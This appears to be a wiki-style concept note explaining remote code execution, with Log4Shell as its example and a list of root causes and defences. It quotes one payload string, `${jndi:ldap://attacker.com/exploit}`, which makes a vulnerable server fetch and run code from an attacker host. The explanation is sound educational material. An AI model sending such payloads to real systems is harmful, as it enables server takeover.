# REMOTE_CODE_EXECUTION

## What it is
Imagine a vending machine with a bug: instead of selecting a snack, you can feed it a slip of paper that makes it dispense *everything* and call your phone. Remote Code Execution (RCE) is when an attacker causes a target system to run arbitrary code of their choosing — across a network — without physical access or prior authentication.

## Why it matters
In 2021, the Log4Shell vulnerability (CVE-2021-44228) allowed attackers to exploit Apache Log4j's logging library by sending a crafted string like `${jndi:ldap://attacker.com/exploit}` in any logged field (user-agent, username, etc.). The server would fetch and execute attacker-controlled Java code, compromising millions of systems — including iCloud, Steam, and government infrastructure — within hours of disclosure.

## Key facts
- RCE is typically rated **CVSS 9.0–10.0 (Critical)** because it grants full control without requiring prior access.
- Common root causes include **buffer overflows**, **deserialization flaws**, **command injection**, and **server-side template injection (SSTI)**.
- RCE vulnerabilities can be **authenticated** (requires login first) or **unauthenticated** (most dangerous; no credentials needed).
- Exploitation often leads to a **reverse shell** — the victim machine initiates an outbound connection to the attacker, bypassing inbound firewall rules.
- Defense layers include: **input validation**, **sandboxing**, **least privilege** (so executed code has minimal permissions), **WAF rules**, and **prompt patching**.

## Related concepts
[[Buffer_Overflow]] [[Command_Injection]] [[Deserialization_Attacks]] [[Reverse_Shell]] [[CVE_Vulnerability_Scoring]]